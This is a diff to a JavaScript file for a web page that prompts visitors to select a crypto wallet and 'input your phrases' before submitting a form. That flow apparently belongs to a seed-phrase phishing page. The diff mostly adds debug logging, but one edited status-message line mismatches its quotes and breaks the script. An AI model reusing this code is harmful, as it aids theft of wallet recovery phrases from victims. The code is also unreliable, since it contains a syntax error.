@@ -1,4 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
+    console.log('Script loaded');
     const walletSelect = document.getElementById('walletSelect');
     const userInput = document.getElementById('userInput');
     const connectWalletButton = document.getElementById('connectWalletButton');
@@ -16,6 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const targetId = anchor.getAttribute('href').substring(1);
             document.getElementById(targetId).scrollIntoView({ behavior: 'smooth' });
             if (targetId === 'connect-wallet') {
+                console.log('Nav link clicked, showing wallet select');
                 walletSelect.style.display = 'block';
                 userInput.style.display = 'block';
                 statusMessage.textContent = 'Please select a wallet and input your phrases.';
@@ -26,6 +28,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Handle option card buttons
     connectButtons.forEach(button => {
         button.addEventListener('click', () => {
+            console.log('Card button clicked:', button.getAttribute('data-option'));
             walletSelect.style.display = 'block';
             userInput.style.display = 'block';
             statusMessage.textContent = `Please select a wallet and input your phrases to ${button.getAttribute('data-option')}.`;
@@ -37,9 +40,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Handle wallet selection
     walletSelect.addEventListener('change', () => {
+        console.log('Wallet selected:', walletSelect.value);
         if (walletSelect.value) {
             connectWalletButton.style.display = 'block';
-            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.`;
+            statusMessage.textContent = `Selected ${walletSelect.value}. Click "Connect Wallet" to proceed.';
         } else {
             connectWalletButton.style.display = 'none';
         }
@@ -47,6 +51,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Handle connect wallet button
     connectWalletButton.addEventListener('click', () => {
+        console.log('Connect Wallet clicked');
         if (walletSelect.value) {
             submitSection.style.display = 'block';
             connectWalletButton.style.display = 'none';
@@ -59,6 +64,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // Handle form submission
     messageForm.addEventListener('submit', (e) => {
         e.preventDefault();
+        console.log('Submitting form');
         statusMessage.textContent = 'Kindly wait';
         statusMessage.style.fontWeight = '600';
         submitButton.disabled = true;
